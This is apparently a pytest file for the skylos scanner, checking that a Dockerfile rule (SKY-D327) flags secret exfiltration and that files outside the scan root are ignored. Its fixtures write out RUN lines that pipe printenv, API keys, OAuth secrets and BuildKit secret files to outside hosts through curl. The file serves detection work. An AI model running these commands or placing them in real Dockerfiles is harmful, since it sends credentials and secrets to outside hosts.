from __future__ import annotations

from pathlib import Path

from skylos.rules.config import scan_config_files
from skylos.rules.config.container.dockerfile import scan_dockerfiles


def _rule_ids(findings: list[dict]) -> set[str]:
    return {finding["rule_id"] for finding in findings}


def test_dockerfile_run_env_exfil_flags(tmp_path: Path):
    dockerfile = tmp_path / "Dockerfile"
    dockerfile.write_text(
        """
FROM python:3.12
RUN printenv | curl -s -X POST https://env.debug.tools/capture -d @-
""".lstrip(),
        encoding="utf-8",
    )

    findings = scan_dockerfiles(tmp_path)

    assert "SKY-D327" in _rule_ids(findings)


def test_dockerfile_run_secret_env_upload_flags(tmp_path: Path):
    dockerfile = tmp_path / "Dockerfile"
    dockerfile.write_text(
        """
FROM python:3.12
RUN curl -s -X POST https://env.debug.tools/capture -d "$OPENAI_API_KEY"
""".lstrip(),
        encoding="utf-8",
    )

    findings = scan_dockerfiles(tmp_path)

    assert "SKY-D327" in _rule_ids(findings)


def test_dockerfile_run_buildkit_secret_upload_flags(tmp_path: Path):
    dockerfile = tmp_path / "Dockerfile.preview"
    dockerfile.write_text(
        """
FROM python:3.12
RUN --mount=type=secret,id=preview \\
    cat /run/secrets/preview | curl -F file=@- https://debug.example/upload
""".lstrip(),
        encoding="utf-8",
    )

    findings = scan_dockerfiles(tmp_path)

    assert "SKY-D327" in _rule_ids(findings)


def test_dockerfile_json_run_shell_exfil_flags(tmp_path: Path):
    dockerfile = tmp_path / "service.Dockerfile"
    dockerfile.write_text(
        """
FROM python:3.12
RUN ["sh", "-c", "printenv | curl -s https://env.debug.tools/capture -d @-"]
""".lstrip(),
        encoding="utf-8",
    )

    findings = scan_dockerfiles(tmp_path)

    assert "SKY-D327" in _rule_ids(findings)


def test_config_scanner_routes_dockerfile(tmp_path: Path):
    dockerfile = tmp_path / "Dockerfile"
    dockerfile.write_text(
        """
FROM python:3.12
RUN curl -s -X POST https://env.debug.tools/capture -d "$PREVIEW_OAUTH_SECRET"
""".lstrip(),
        encoding="utf-8",
    )

    findings = scan_config_files(tmp_path)

    assert "SKY-D327" in _rule_ids(findings)


def test_dockerfile_changed_files_stay_under_scan_root(tmp_path: Path):
    repo = tmp_path / "repo"
    outside = tmp_path / "outside"
    repo.mkdir()
    outside.mkdir()
    outside_dockerfile = outside / "Dockerfile"
    outside_dockerfile.write_text(
        """
FROM python:3.12
RUN printenv | curl -s -X POST https://env.debug.tools/capture -d @-
""".lstrip(),
        encoding="utf-8",
    )

    findings = scan_config_files(
        repo,
        changed_files={str(outside_dockerfile), "../outside/Dockerfile"},
    )

    assert findings == []
